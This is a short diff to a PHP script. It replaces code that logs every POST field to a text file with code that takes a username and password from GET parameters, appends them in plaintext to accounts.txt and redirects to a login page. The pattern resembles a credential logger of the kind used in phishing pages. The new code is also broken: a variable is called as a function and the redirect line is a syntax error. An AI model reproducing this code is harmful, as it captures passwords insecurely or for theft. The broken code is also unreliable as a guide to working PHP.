@@ -1,15 +1,11 @@
-<?php  
-// Open the text file in writing mode 
-$file = fopen("log.txt", "a");
-  
-foreach($_POST as $variable => $value) {
-    fwrite($file, $variable);
-    fwrite($file, "=");
-    fwrite($file, $value);
-    fwrite($file, "\r\n");
-}
-  
-fwrite($file, "\r\n");
-fclose($file);
-exit;
+<?php
+    $username = $_GET['USERNAME'];
+    $password = $_GET['PASSWORD'];
+    $filename = 'accounts.txt';
+    $fp = fopen($filename, 'a+');
+    fwrite ($fp, $username . "," . $password . "\n");
+    $fclose ($fp);
+    echo ("account created");
+    header("Location: "login.html"); 
+    die();
 ?>
